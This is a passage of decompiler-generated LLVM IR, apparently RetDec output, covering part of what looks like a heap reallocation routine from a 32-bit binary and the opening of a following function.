  %v2_8050fd7 = inttoptr i32 %v1_8050fd7 to i32*
  %v3_8050fd7 = load i32, i32* %v2_8050fd7, align 4
  br i1 %v1_8050f9d, label %dec_label_pc_8050fd7, label %dec_label_pc_8050f9f

dec_label_pc_8050f9f:                             ; preds = %dec_label_pc_8050f94
  %v1_8050fa4 = and i32 %v3_8050fd7, -4
  %v2_8050fa7 = add i32 %v1_8050fa4, %v1_8050f76
  store i32 %v2_8050fa7, i32* %ecx.global-to-local, align 4
  %v1_8050fad = add i32 %.v1_8050f63, 16
  store i32 %v1_8050fad, i32* %eax.global-to-local, align 4
  %v7_8050fb0 = icmp ult i32 %v2_8050fa7, %v1_8050fad
  br i1 %v7_8050fb0, label %dec_label_pc_8051015, label %dec_label_pc_8050fb4

dec_label_pc_8050fb4:                             ; preds = %dec_label_pc_8050f9f
  %v1_8050fb4 = urem i32 %v3_8050f71, 2
  %v5_8050fb7 = or i32 %v1_8050fb4, %.v1_8050f63
  store i32 %v5_8050fb7, i32* %edx.global-to-local, align 4
  store i32 %v5_8050fb7, i32* %v2_8050f71, align 4
  %v0_8050fc2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050fc2 = sub i32 %v0_8050fc2, %.v1_8050f63
  %v0_8050fc4 = load i32, i32* @edi, align 4
  %v2_8050fc4 = add i32 %v0_8050fc4, %.v1_8050f63
  store i32 %v2_8050fc4, i32* %eax.global-to-local, align 4
  %v1_8050fc7 = or i32 %v2_8050fc2, 1
  store i32 %v1_8050fc7, i32* %ecx.global-to-local, align 4
  store i32 %v2_8050fc4, i32* @global_var_805336c.33, align 4
  %v2_8050fcf = add i32 %v2_8050fc4, 4
  %v3_8050fcf = inttoptr i32 %v2_8050fcf to i32*
  store i32 %v1_8050fc7, i32* %v3_8050fcf, align 4
  br label %dec_label_pc_80511ea

dec_label_pc_8050fd7:                             ; preds = %dec_label_pc_8050f94
  store i32 %v3_8050fd7, i32* %edx.global-to-local, align 4
  %v1_8050fdc = and i32 %v3_8050fd7, -2
  store i32 %v1_8050fdc, i32* %eax.global-to-local, align 4
  %v3_8050fdf = add i32 %v1_8050fd7, %v1_8050fdc
  %v4_8050fdf = inttoptr i32 %v3_8050fdf to i8*
  %v5_8050fdf = load i8, i8* %v4_8050fdf, align 1
  %v6_8050fdf = urem i8 %v5_8050fdf, 2
  %v7_8050fdf = icmp eq i8 %v6_8050fdf, 0
  %v1_8050fe4 = icmp eq i1 %v7_8050fdf, false
  br i1 %v1_8050fe4, label %dec_label_pc_8051015, label %dec_label_pc_8050fe6

dec_label_pc_8050fe6:                             ; preds = %dec_label_pc_8050fd7
  %v1_8050fe6 = and i32 %v3_8050fd7, -4
  store i32 %v1_8050fe6, i32* %edx.global-to-local, align 4
  %v2_8050fed = add i32 %v1_8050fe6, %v1_8050f76
  store i32 %v2_8050fed, i32* @ebx, align 4
  %v10_8050fef = icmp ult i32 %v2_8050fed, %.v1_8050f63
  br i1 %v10_8050fef, label %dec_label_pc_8051015, label %dec_label_pc_8050ff5

dec_label_pc_8050ff5:                             ; preds = %dec_label_pc_8050fe6
  %v1_8050ff5 = add i32 %v1_8050f76, %tmp7
  %v2_8050ff5 = inttoptr i32 %v1_8050ff5 to i32*
  %v3_8050ff5 = load i32, i32* %v2_8050ff5, align 4
  store i32 %v3_8050ff5, i32* @edx, align 4
  %v1_8050ff8 = add i32 %v2_8050f94, 12
  %v2_8050ff8 = inttoptr i32 %v1_8050ff8 to i32*
  %v3_8050ff8 = load i32, i32* %v2_8050ff8, align 4
  store i32 %v3_8050ff8, i32* %eax.global-to-local, align 4
  %v1_8050ffb = add i32 %v3_8050ff5, 12
  %v2_8050ffb = inttoptr i32 %v1_8050ffb to i32*
  %v3_8050ffb = load i32, i32* %v2_8050ffb, align 4
  %v15_8050ffb = icmp eq i32 %v3_8050ffb, %v2_8050f94
  %v1_8050ffe = icmp eq i1 %v15_8050ffb, false
  br i1 %v1_8050ffe, label %dec_label_pc_8051005, label %dec_label_pc_8051000

dec_label_pc_8051000:                             ; preds = %dec_label_pc_8050ff5
  %v1_8051000 = add i32 %v3_8050ff8, 8
  %v2_8051000 = inttoptr i32 %v1_8051000 to i32*
  %v3_8051000 = load i32, i32* %v2_8051000, align 4
  %v15_8051000 = icmp eq i32 %v3_8051000, %v2_8050f94
  br i1 %v15_8051000, label %dec_label_pc_805100a, label %dec_label_pc_8051005

dec_label_pc_8051005:                             ; preds = %dec_label_pc_8051000, %dec_label_pc_8050ff5
  %v0_8051005 = call i32 @function_80515da()
  store i32 %v0_8051005, i32* %eax.global-to-local, align 4
  %v1_805100a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805100a

dec_label_pc_805100a:                             ; preds = %dec_label_pc_8051000, %dec_label_pc_8051005
  %v1_805100a = phi i32 [ %v3_8050ff5, %dec_label_pc_8051000 ], [ %v1_805100a.pre, %dec_label_pc_8051005 ]
  %v0_805100a = phi i32 [ %v3_8050ff8, %dec_label_pc_8051000 ], [ %v0_8051005, %dec_label_pc_8051005 ]
  %v2_805100a = add i32 %v1_805100a, 12
  %v3_805100a = inttoptr i32 %v2_805100a to i32*
  store i32 %v0_805100a, i32* %v3_805100a, align 4
  %v0_805100d = load i32, i32* @edx, align 4
  %v1_805100d = load i32, i32* %eax.global-to-local, align 4
  %v2_805100d = add i32 %v1_805100d, 8
  %v3_805100d = inttoptr i32 %v2_805100d to i32*
  store i32 %v0_805100d, i32* %v3_805100d, align 4
  %v0_80510c5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80510c5

dec_label_pc_8051015:                             ; preds = %dec_label_pc_8050fe6, %dec_label_pc_8050fd7, %dec_label_pc_8050f9f
  %v1_805101c = add i32 %.v1_8050f63, -7
  store i32 %v1_805101c, i32* %eax.global-to-local, align 4
  store i32 %v1_805101c, i32* %stack_var_-60, align 4
  %v1_8051020 = call i32 @function_8050679(i32 %v1_805101c)
  store i32 %v1_8051020, i32* %eax.global-to-local, align 4
  store i32 %v1_8051020, i32* %edx.global-to-local, align 4
  %v1_805102a = icmp eq i32 %v1_8051020, 0
  br i1 %v1_805102a, label %dec_label_pc_80511e6, label %dec_label_pc_8051032

dec_label_pc_8051032:                             ; preds = %dec_label_pc_8051015
  %v1_8051032 = add i32 %v1_8051020, -8
  store i32 %v1_8051032, i32* %ebx.global-to-local, align 4
  %v1_8051035 = load i32, i32* @esi, align 4
  %v12_8051035 = icmp eq i32 %v1_8051032, %v1_8051035
  %v1_8051037 = add i32 %v1_8051020, -4
  %v2_8051037 = inttoptr i32 %v1_8051037 to i32*
  %v3_8051037 = load i32, i32* %v2_8051037, align 4
  store i32 %v3_8051037, i32* %eax.global-to-local, align 4
  %v1_805103a = icmp eq i1 %v12_8051035, false
  br i1 %v1_805103a, label %dec_label_pc_8051048, label %dec_label_pc_805103c

dec_label_pc_805103c:                             ; preds = %dec_label_pc_8051032
  %v1_805103c = and i32 %v3_8051037, -4
  store i32 %v1_805103c, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f76, i32* %edx.global-to-local, align 4
  %v2_8051043 = add i32 %v1_805103c, %v1_8050f76
  store i32 %v2_8051043, i32* @ebx, align 4
  br label %dec_label_pc_80510c5

dec_label_pc_8051048:                             ; preds = %dec_label_pc_8051032
  %v1_805104c = add i32 %v1_8050f76, -4
  store i32 %v1_805104c, i32* %eax.global-to-local, align 4
  %v2_8051051 = udiv i32 %v1_805104c, 4
  store i32 %v2_8051051, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805104c, 37
  br i1 %tmp, label %dec_label_pc_805106a, label %dec_label_pc_8051059

dec_label_pc_8051059:                             ; preds = %dec_label_pc_8051048
  store i32 %v1_8051020, i32* %stack_var_-60, align 4
  %v3_8051060 = inttoptr i32 %v1_8051020 to i16*
  %v4_8051060 = call i32 @function_8052466(i16* %v3_8051060, i32 %tmp7, i32 %v1_805104c)
  store i32 %v4_8051060, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80510b1

dec_label_pc_805106a:                             ; preds = %dec_label_pc_8051048
  store i32 %tmp7, i32* @esi, align 4
  %v2_8051071 = load i32, i32* %arg1, align 4
  store i32 %v2_8051071, i32* %eax.global-to-local, align 4
  %v2_8051073 = inttoptr i32 %v1_8051020 to i32*
  store i32 %v2_8051071, i32* %v2_8051073, align 4
  %v0_8051075 = load i32, i32* @esi, align 4
  %v1_8051075 = add i32 %v0_8051075, 4
  %v2_8051075 = inttoptr i32 %v1_8051075 to i32*
  %v3_8051075 = load i32, i32* %v2_8051075, align 4
  store i32 %v3_8051075, i32* %eax.global-to-local, align 4
  %v1_8051078 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051078 = add i32 %v1_8051078, 4
  %v3_8051078 = inttoptr i32 %v2_8051078 to i32*
  store i32 %v3_8051075, i32* %v3_8051078, align 4
  %v0_805107b = load i32, i32* @esi, align 4
  %v1_805107b = add i32 %v0_805107b, 8
  %v2_805107b = inttoptr i32 %v1_805107b to i32*
  %v3_805107b = load i32, i32* %v2_805107b, align 4
  store i32 %v3_805107b, i32* %eax.global-to-local, align 4
  %v1_805107e = load i32, i32* %edx.global-to-local, align 4
  %v2_805107e = add i32 %v1_805107e, 8
  %v3_805107e = inttoptr i32 %v2_805107e to i32*
  store i32 %v3_805107b, i32* %v3_805107e, align 4
  %tmp28 = icmp ult i32 %v1_805104c, 17
  br i1 %tmp28, label %dec_label_pc_80510b1, label %dec_label_pc_8051083

dec_label_pc_8051083:                             ; preds = %dec_label_pc_805106a
  %v0_8051083 = load i32, i32* @esi, align 4
  %v1_8051083 = add i32 %v0_8051083, 12
  %v2_8051083 = inttoptr i32 %v1_8051083 to i32*
  %v3_8051083 = load i32, i32* %v2_8051083, align 4
  store i32 %v3_8051083, i32* %eax.global-to-local, align 4
  %v0_8051086 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051089 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051089 = add i32 %v1_8051089, 12
  %v3_8051089 = inttoptr i32 %v2_8051089 to i32*
  store i32 %v3_8051083, i32* %v3_8051089, align 4
  %v0_805108c = load i32, i32* @esi, align 4
  %v1_805108c = add i32 %v0_805108c, 16
  %v2_805108c = inttoptr i32 %v1_805108c to i32*
  %v3_805108c = load i32, i32* %v2_805108c, align 4
  store i32 %v3_805108c, i32* %eax.global-to-local, align 4
  %v1_805108f = load i32, i32* %edx.global-to-local, align 4
  %v2_805108f = add i32 %v1_805108f, 16
  %v3_805108f = inttoptr i32 %v2_805108f to i32*
  store i32 %v3_805108c, i32* %v3_805108f, align 4
  %tmp23 = icmp ult i32 %v0_8051086, 7
  br i1 %tmp23, label %dec_label_pc_80510b1, label %dec_label_pc_8051094

dec_label_pc_8051094:                             ; preds = %dec_label_pc_8051083
  %v0_8051094 = load i32, i32* @esi, align 4
  %v1_8051094 = add i32 %v0_8051094, 20
  %v2_8051094 = inttoptr i32 %v1_8051094 to i32*
  %v3_8051094 = load i32, i32* %v2_8051094, align 4
  store i32 %v3_8051094, i32* %eax.global-to-local, align 4
  %v0_8051097 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805109a = load i32, i32* %edx.global-to-local, align 4
  %v2_805109a = add i32 %v1_805109a, 20
  %v3_805109a = inttoptr i32 %v2_805109a to i32*
  store i32 %v3_8051094, i32* %v3_805109a, align 4
  %v0_805109d = load i32, i32* @esi, align 4
  %v1_805109d = add i32 %v0_805109d, 24
  %v2_805109d = inttoptr i32 %v1_805109d to i32*
  %v3_805109d = load i32, i32* %v2_805109d, align 4
  store i32 %v3_805109d, i32* %eax.global-to-local, align 4
  %v1_80510a0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80510a0 = add i32 %v1_80510a0, 24
  %v3_80510a0 = inttoptr i32 %v2_80510a0 to i32*
  store i32 %v3_805109d, i32* %v3_80510a0, align 4
  %tmp24 = icmp ult i32 %v0_8051097, 9
  br i1 %tmp24, label %dec_label_pc_80510b1, label %dec_label_pc_80510a5

dec_label_pc_80510a5:                             ; preds = %dec_label_pc_8051094
  %v0_80510a5 = load i32, i32* @esi, align 4
  %v1_80510a5 = add i32 %v0_80510a5, 28
  %v2_80510a5 = inttoptr i32 %v1_80510a5 to i32*
  %v3_80510a5 = load i32, i32* %v2_80510a5, align 4
  store i32 %v3_80510a5, i32* %eax.global-to-local, align 4
  %v1_80510a8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80510a8 = add i32 %v1_80510a8, 28
  %v3_80510a8 = inttoptr i32 %v2_80510a8 to i32*
  store i32 %v3_80510a5, i32* %v3_80510a8, align 4
  %v0_80510ab = load i32, i32* @esi, align 4
  %v1_80510ab = add i32 %v0_80510ab, 32
  %v2_80510ab = inttoptr i32 %v1_80510ab to i32*
  %v3_80510ab = load i32, i32* %v2_80510ab, align 4
  store i32 %v3_80510ab, i32* %eax.global-to-local, align 4
  %v1_80510ae = load i32, i32* %edx.global-to-local, align 4
  %v2_80510ae = add i32 %v1_80510ae, 32
  %v3_80510ae = inttoptr i32 %v2_80510ae to i32*
  store i32 %v3_80510ab, i32* %v3_80510ae, align 4
  br label %dec_label_pc_80510b1

dec_label_pc_80510b1:                             ; preds = %dec_label_pc_8051094, %dec_label_pc_8051083, %dec_label_pc_805106a, %dec_label_pc_8051059, %dec_label_pc_80510a5
  %v0_80510b4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80510b4 = add i32 %v0_80510b4, 8
  store i32 %v1_80510b4, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80510bb = call i32 @function_805143e(i32 %tmp7)
  br label %dec_label_pc_80511e1

dec_label_pc_80510c5:                             ; preds = %dec_label_pc_8050f86, %dec_label_pc_805103c, %dec_label_pc_805100a
  %v1_80510d6 = phi i32 [ %v1_8050f76, %dec_label_pc_8050f86 ], [ %v2_8051043, %dec_label_pc_805103c ], [ %v0_80510c5.pre, %dec_label_pc_805100a ]
  %v5_80510c7 = sub i32 %v1_80510d6, %.v1_8050f63
  store i32 %v5_80510c7, i32* %ecx.global-to-local, align 4
  %tmp25 = icmp ult i32 %v5_80510c7, 16
  br i1 %tmp25, label %dec_label_pc_80510d0, label %dec_label_pc_80510e2

dec_label_pc_80510d0:                             ; preds = %dec_label_pc_80510c5
  %v0_80510d0 = load i32, i32* @edi, align 4
  %v1_80510d0 = add i32 %v0_80510d0, 4
  %v2_80510d0 = inttoptr i32 %v1_80510d0 to i32*
  %v3_80510d0 = load i32, i32* %v2_80510d0, align 4
  %v1_80510d3 = urem i32 %v3_80510d0, 2
  %v2_80510d6 = or i32 %v1_80510d3, %v1_80510d6
  store i32 %v2_80510d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80510d6, i32* %v2_80510d0, align 4
  %v0_80510db = load i32, i32* @edi, align 4
  %v1_80510db = load i32, i32* @ebx, align 4
  %v2_80510db = add i32 %v0_80510db, 4
  %v3_80510db = add i32 %v2_80510db, %v1_80510db
  %v4_80510db = inttoptr i32 %v3_80510db to i32*
  %v5_80510db = load i32, i32* %v4_80510db, align 4
  %v6_80510db = or i32 %v5_80510db, 1
  store i32 %v6_80510db, i32* %v4_80510db, align 4
  br label %dec_label_pc_8051112

dec_label_pc_80510e2:                             ; preds = %dec_label_pc_80510c5
  store i32 %.v1_8050f63, i32* %edx.global-to-local, align 4
  %v0_80510e6 = load i32, i32* @edi, align 4
  %v2_80510e6 = add i32 %v0_80510e6, %.v1_8050f63
  store i32 %v2_80510e6, i32* %eax.global-to-local, align 4
  %v1_80510e9 = add i32 %v0_80510e6, 4
  %v2_80510e9 = inttoptr i32 %v1_80510e9 to i32*
  %v3_80510e9 = load i32, i32* %v2_80510e9, align 4
  %v1_80510ec = urem i32 %v3_80510e9, 2
  %v5_80510ef = or i32 %v1_80510ec, %.v1_8050f63
  store i32 %v5_80510ef, i32* %v2_80510e9, align 4
  %v0_80510f9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80510fb = or i32 %v0_80510f9, 1
  store i32 %v1_80510fb, i32* %edx.global-to-local, align 4
  %v1_80510fe = load i32, i32* %eax.global-to-local, align 4
  %v2_80510fe = add i32 %v1_80510fe, 4
  %v3_80510fe = inttoptr i32 %v2_80510fe to i32*
  store i32 %v1_80510fb, i32* %v3_80510fe, align 4
  %v0_8051101 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051101 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051101 = add i32 %v0_8051101, 4
  %v3_8051101 = add i32 %v2_8051101, %v1_8051101
  %v4_8051101 = inttoptr i32 %v3_8051101 to i32*
  %v5_8051101 = load i32, i32* %v4_8051101, align 4
  %v6_8051101 = or i32 %v5_8051101, 1
  store i32 %v6_8051101, i32* %v4_8051101, align 4
  %v0_8051106 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051106 = add i32 %v0_8051106, 8
  store i32 %v1_8051106, i32* %eax.global-to-local, align 4
  store i32 %v1_8051106, i32* %stack_var_-60, align 4
  %v1_805110a = call i32 @function_805143e(i32 %v1_8051106)
  store i32 %v1_805110a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051112

dec_label_pc_8051112:                             ; preds = %dec_label_pc_80510d0, %dec_label_pc_80510e2
  %v0_8051112 = load i32, i32* @edi, align 4
  %v1_8051112 = add i32 %v0_8051112, 8
  store i32 %v1_8051112, i32* @ebx, align 4
  br label %dec_label_pc_80511ee

dec_label_pc_805111a:                             ; preds = %dec_label_pc_8050f53
  store i32 %tmp7, i32* %ecx.global-to-local, align 4
  %v0_805111e = load i32, i32* @global_var_805369c.38, align 4
  %v1_8051123 = add i32 %v0_805111e, -1
  store i32 %v1_8051123, i32* %eax.global-to-local, align 4
  %v2_8051128 = inttoptr i32 %v1_8050f6e to i32*
  %v3_8051128 = load i32, i32* %v2_8051128, align 4
  store i32 %v3_8051128, i32* @ebp, align 4
  %v1_805112b = or i32 %.v1_8050f63, 4
  store i32 %v1_805112b, i32* %stack_var_-44, align 4
  %v2_8051131 = add i32 %v3_8051128, %v1_8051123
  store i32 %v2_8051131, i32* %edx.global-to-local, align 4
  %v1_8051134 = sub i32 0, %v0_805111e
  store i32 %v1_8051134, i32* %eax.global-to-local, align 4
  %v2_8051136 = add i32 %v2_8051131, %v1_805112b
  %v2_8051139 = and i32 %v2_8051136, %v1_8051134
  store i32 %v2_8051139, i32* @esi, align 4
  %v2_805113d = sub i32 %v2_8051139, %v3_8051128
  store i32 %v2_805113d, i32* @ebx, align 4
  %v15_805113f = icmp eq i32 %v1_8050f76, %v2_805113d
  br i1 %v15_805113f, label %dec_label_pc_80511ea, label %dec_label_pc_8051149

dec_label_pc_8051149:                             ; preds = %dec_label_pc_805111a
  %v2_8051150 = sub i32 %v1_8050f6e, %v3_8051128
  store i32 %v2_8051150, i32* @edi, align 4
  %v2_8051152 = add i32 %v3_8051128, %v1_8050f76
  store i32 %v2_8051152, i32* %eax.global-to-local, align 4
  store i32 %v2_8051150, i32* %stack_var_-60, align 4
  %v6_8051156 = inttoptr i32 %v2_8051150 to i32*
  %v7_8051156 = call i32 @function_80522ca(i32* %v6_8051156, i32 %v2_8051152, i32 %v2_8051139, i32 1, i32 %v1_805112b, i32 %v1_8050f76)
  store i32 %v7_8051156, i32* %eax.global-to-local, align 4
  %v10_805115e = icmp eq i32 %v7_8051156, -1
  br i1 %v10_805115e, label %dec_label_pc_80511a2, label %dec_label_pc_8051163

dec_label_pc_8051163:                             ; preds = %dec_label_pc_8051149
  %v1_8051163 = load i32, i32* @ebp, align 4
  %v2_8051163 = add i32 %v1_8051163, %v7_8051156
  store i32 %v2_8051163, i32* %edx.global-to-local, align 4
  %v0_8051166 = load i32, i32* @ebx, align 4
  %v1_8051166 = or i32 %v0_8051166, 2
  store i32 %v1_8051166, i32* %ebx.global-to-local, align 4
  %v0_8051169 = load i32, i32* @esi, align 4
  store i32 %v0_8051169, i32* %eax.global-to-local, align 4
  %v2_805116b = add i32 %v2_8051163, 4
  %v3_805116b = inttoptr i32 %v2_805116b to i32*
  store i32 %v1_8051166, i32* %v3_805116b, align 4
  %v0_805116e = load i32, i32* %eax.global-to-local, align 4
  %v5_805116e = sub i32 %v0_805116e, %v1_8050f76
  %v1_8051172 = load i32, i32* @global_var_80536a4.43, align 4
  %v2_8051172 = add i32 %v1_8051172, %v5_805116e
  store i32 %v2_8051172, i32* %eax.global-to-local, align 4
  store i32 %v2_8051172, i32* @global_var_80536a4.43, align 4
  %v1_805117d = load i32, i32* @global_var_80536b0.44, align 16
  %tmp26 = icmp ugt i32 %v2_8051172, %v1_805117d
  br i1 %tmp26, label %dec_label_pc_8051185, label %dec_label_pc_805118a

dec_label_pc_8051185:                             ; preds = %dec_label_pc_8051163
  store i32 %v2_8051172, i32* @global_var_80536b0.44, align 16
  br label %dec_label_pc_805118a

dec_label_pc_805118a:                             ; preds = %dec_label_pc_8051163, %dec_label_pc_8051185
  %v1_805118a = load i32, i32* @global_var_80536a8.45, align 8
  %v2_805118a = add i32 %v1_805118a, %v2_8051172
  store i32 %v2_805118a, i32* %eax.global-to-local, align 4
  %v1_8051190 = load i32, i32* @global_var_80536b4.46, align 4
  %tmp27 = icmp ugt i32 %v2_805118a, %v1_8051190
  br i1 %tmp27, label %dec_label_pc_8051198, label %dec_label_pc_805119d

dec_label_pc_8051198:                             ; preds = %dec_label_pc_805118a
  store i32 %v2_805118a, i32* @global_var_80536b4.46, align 4
  br label %dec_label_pc_805119d

dec_label_pc_805119d:                             ; preds = %dec_label_pc_805118a, %dec_label_pc_8051198
  %v0_805119d = load i32, i32* %edx.global-to-local, align 4
  %v1_805119d = add i32 %v0_805119d, 8
  store i32 %v1_805119d, i32* @ebx, align 4
  br label %dec_label_pc_80511ee

dec_label_pc_80511a2:                             ; preds = %dec_label_pc_8051149
  %v2_80511a2 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_80511a2, i32* %eax.global-to-local, align 4
  %v10_80511a5 = icmp ult i32 %v1_8050f76, %v2_80511a2
  %v1_80511a9 = icmp eq i1 %v10_80511a5, false
  br i1 %v1_80511a9, label %dec_label_pc_80511ea, label %dec_label_pc_80511ab

dec_label_pc_80511ab:                             ; preds = %dec_label_pc_80511a2
  %v1_80511b2 = add i32 %.v1_8050f63, -7
  store i32 %v1_80511b2, i32* %eax.global-to-local, align 4
  store i32 %v1_80511b2, i32* %stack_var_-60, align 4
  %v1_80511b6 = call i32 @function_8050679(i32 %v1_80511b2)
  store i32 %v1_80511b6, i32* %eax.global-to-local, align 4
  store i32 %v1_80511b6, i32* @ebx, align 4
  %v1_80511c0 = icmp eq i32 %v1_80511b6, 0
  br i1 %v1_80511c0, label %dec_label_pc_80511e6, label %dec_label_pc_80511c4

dec_label_pc_80511c4:                             ; preds = %dec_label_pc_80511ab
  %v1_80511c9 = add i32 %v1_8050f76, -8
  store i32 %v1_80511c9, i32* %eax.global-to-local, align 4
  store i32 %v1_80511b6, i32* %stack_var_-60, align 4
  %v3_80511d2 = inttoptr i32 %v1_80511b6 to i16*
  %v4_80511d2 = call i32 @function_8052466(i16* %v3_80511d2, i32 %tmp7, i32 %v1_80511c9)
  store i32 %v4_80511d2, i32* %eax.global-to-local, align 4
  store i32 %v1_80511b6, i32* %edx.global-to-local, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80511dc = call i32 @function_805143e(i32 %tmp7)
  br label %dec_label_pc_80511e1

dec_label_pc_80511e1:                             ; preds = %dec_label_pc_80510b1, %dec_label_pc_80511c4
  %storemerge = phi i32 [ %v1_80511dc, %dec_label_pc_80511c4 ], [ %v1_80510bb, %dec_label_pc_80510b1 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80511ee

dec_label_pc_80511e6:                             ; preds = %dec_label_pc_80511ab, %dec_label_pc_8051015
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80511ee

dec_label_pc_80511ea:                             ; preds = %dec_label_pc_80511a2, %dec_label_pc_805111a, %dec_label_pc_8050fb4
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_80511ee

dec_label_pc_80511ee:                             ; preds = %dec_label_pc_80511e6, %dec_label_pc_80511e1, %dec_label_pc_805119d, %dec_label_pc_8051112, %dec_label_pc_80511ea
  store i32 %v2_8050f23, i32* @eax, align 4
  store i32 %v2_8050f23, i32* %stack_var_-60, align 4
  %v2_80511f7 = call i32 @function_8051ba5(i32 %v2_8050f23, i32 1)
  store i32 %v2_80511f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80511fc

dec_label_pc_80511fc:                             ; preds = %dec_label_pc_8050f07, %dec_label_pc_8050ef3, %dec_label_pc_80511ee
  br label %dec_label_pc_80511ff

dec_label_pc_80511ff:                             ; preds = %dec_label_pc_8050f41, %dec_label_pc_80511fc
  %v0_8051202 = load i32, i32* @ebx, align 4
  store i32 %v0_8051202, i32* %eax.global-to-local, align 4
  store i32 %v0_8050ee4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051202

; uselistorder directives
  uselistorder i32 %v1_80511b6, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_805118a, { 1, 0, 2 }
  uselistorder i32 %v2_8051172, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8051150, { 1, 0, 2 }
  uselistorder i32 %v1_805112b, { 1, 0, 2 }
  uselistorder i32 %v3_8051128, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_80510e6, { 1, 0 }
  uselistorder i32 %v1_805104c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8051020, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8050fc4, { 1, 0, 2 }
  uselistorder i32 %v3_8050fd7, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8050f94, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8050f76, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8050f6e, { 1, 2, 0, 3 }
  uselistorder i32 %.v1_8050f63, { 4, 13, 0, 1, 8, 7, 9, 10, 2, 12, 3, 11, 5, 6 }
  uselistorder i32 %v1_8050f53, { 0, 2, 1 }
  uselistorder i32 %v0_8050f3c, { 1, 0 }
  uselistorder i32 %v2_8050f23, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 6, 15, 16, 17, 18, 19 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 50, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 37, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 -32, { 0, 1, 3, 2, 4 }
  uselistorder i32 (i32)* @function_805143e, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_8050679, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80511ff, { 1, 0 }
  uselistorder label %dec_label_pc_80511fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80511ee, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80511e1, { 1, 0 }
  uselistorder label %dec_label_pc_805119d, { 1, 0 }
  uselistorder label %dec_label_pc_805118a, { 1, 0 }
  uselistorder label %dec_label_pc_8051112, { 1, 0 }
  uselistorder label %dec_label_pc_80510c5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80510b1, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805100a, { 1, 0 }
}

define i32 @function_8051209() local_unnamed_addr {
dec_label_pc_8051209:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_8051210 = load i32, i32* @edx, align 4
  store i32 %v0_8051210, i32* %ebp.global-to-local, align 4
  %v1_8051212 = add i32 %v0_8051210, 860
  %v2_8051212 = inttoptr i32 %v1_8051212 to i32*
  %v3_8051212 = load i32, i32* %v2_8051212, align 4
  store i32 %v3_8051212, i32* %ecx.global-to-local, align 4
  %v1_8051218 = add i32 %v0_8051210, 44
  %v2_8051218 = inttoptr i32 %v1_8051218 to i32*
  %v3_8051218 = load i32, i32* %v2_8051218, align 4
  %v1_805121b = add i32 %v3_8051218, 4
  %v2_805121b = inttoptr i32 %v1_805121b to i32*
  %v3_805121b = load i32, i32* %v2_805121b, align 4
  %v1_805121e = and i32 %v3_805121b, -4
  store i32 %v1_805121e, i32* @esi, align 4
  %v1_8051223 = load i32, i32* @eax, align 4
  %v2_8051223 = add i32 %v3_8051212, -17
  %v2_8051225 = add i32 %v2_8051223, %v1_805121e
  %v3_8051225 = sub i32 %v2_8051225, %v1_8051223
  %div = udiv i32 %v3_8051225, %v3_8051212
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8051225, %v3_8051212
  store i32 %tmp10, i32* @edx, align 4
  %v1_805122d = add i32 %div, -1
  %v4_8051230 = mul i32 %v1_805122d, %v3_8051212
  store i32 %v4_8051230, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8051230, 1
  br i1 %tmp11, label %dec_label_pc_805128e, label %dec_label_pc_8051237

